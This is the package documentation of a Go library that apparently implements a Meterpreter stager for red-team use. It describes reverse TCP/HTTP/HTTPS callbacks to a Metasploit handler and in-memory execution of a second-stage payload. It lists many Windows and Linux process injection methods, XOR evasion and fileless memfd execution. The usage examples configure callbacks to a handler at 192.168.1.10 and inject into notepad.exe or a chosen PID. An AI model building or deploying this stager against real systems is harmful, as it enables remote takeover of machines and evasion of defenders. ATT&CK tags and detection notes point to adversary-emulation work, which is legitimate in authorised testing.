// Package meterpreter implements Metasploit Framework staging functionality
// for receiving and executing second-stage Meterpreter payloads.
//
// Technique: Meterpreter stager connecting to Metasploit multi/handler.
// MITRE ATT&CK: T1059 (Command and Scripting Interpreter), T1055 (Process Injection)
// Platform: Cross-platform (Windows and Linux)
// Detection: High -- Meterpreter staging is a well-known attack pattern;
// network signatures exist for all transport types.
//
// Supports three transport protocols:
//   - TCP: direct reverse TCP connection
//   - HTTP: reverse HTTP connection
//   - HTTPS: reverse HTTPS with optional InsecureSkipVerify
//
// # Stage Execution Methods
//
// By default the stager uses a simple self-injection path:
//   - Windows: VirtualAlloc + RtlMoveMemory + VirtualProtect + CreateThread
//   - Linux: mmap + purego.SyscallN (System V AMD64 ABI)
//
// Set Config.Method to route execution through the inject package, which
// supports 10+ Windows methods and 5 Linux methods with automatic fallback.
//
// Windows injection methods (Config.Method values):
//   - "ct"         CreateThread — self-injection with XOR evasion (default for staging)
//   - "crt"        CreateRemoteThread — remote injection into target PID
//   - "apc"        QueueUserAPC — APC injection into existing thread
//   - "earlybird"  EarlyBirdAPC — APC into suspended child process
//   - "threadhijack" ThreadHijack — modify suspended thread context (RIP)
//   - "rtl"        RtlCreateUserThread — undocumented ntdll thread creation
//   - "fiber"      CreateFiber — fiber-based execution (no thread creation)
//   - "etwthr"     EtwpCreateEtwThread — abuse internal ETW thread creation
//   - "apcex"      NtQueueApcThreadEx — special APC, no alertable wait (Win10 1903+)
//   - "syscall"    DirectSyscall — raw syscall stubs (legacy, prefer WindowsConfig)
//
// Linux injection methods:
//   - "procmem"    ProcMem — self-injection via mmap (default for staging)
//   - "ptrace"     Ptrace — remote injection via ptrace attach
//   - "memfd"      MemFD — fileless execution via memfd_create
//
// Remote methods (crt, apc, rtl, apcex, ptrace) require Config.TargetPID.
// Spawn methods (earlybird, threadhijack) require Config.ProcessPath.
// Set Config.Fallback to enable automatic fallback chains on failure.
//
// # Usage
//
// Default self-injection (no Method):
//
//	cfg := &meterpreter.Config{
//	    Transport: meterpreter.TransportTCP,
//	    Host:      "192.168.1.10",
//	    Port:      "4444",
//	    Timeout:   30 * time.Second,
//	}
//	stager := meterpreter.NewStager(cfg)
//	err := stager.Stage(context.Background())
//
// With specific injection method:
//
//	cfg := &meterpreter.Config{
//	    Transport:   meterpreter.TransportTCP,
//	    Host:        "192.168.1.10",
//	    Port:        "4444",
//	    Timeout:     30 * time.Second,
//	    Method:      inject.MethodEarlyBirdAPC,
//	    ProcessPath: `C:\Windows\System32\notepad.exe`,
//	    Fallback:    true,
//	}
//	stager := meterpreter.NewStager(cfg)
//	err := stager.Stage(context.Background())
//
// With remote injection into existing process:
//
//	cfg := &meterpreter.Config{
//	    Transport: meterpreter.TransportHTTPS,
//	    Host:      "192.168.1.10",
//	    Port:      "8443",
//	    Timeout:   30 * time.Second,
//	    Method:    inject.MethodCreateRemoteThread,
//	    TargetPID: 1234,
//	    Fallback:  true,
//	}
//	stager := meterpreter.NewStager(cfg)
//	err := stager.Stage(context.Background())
package meterpreter
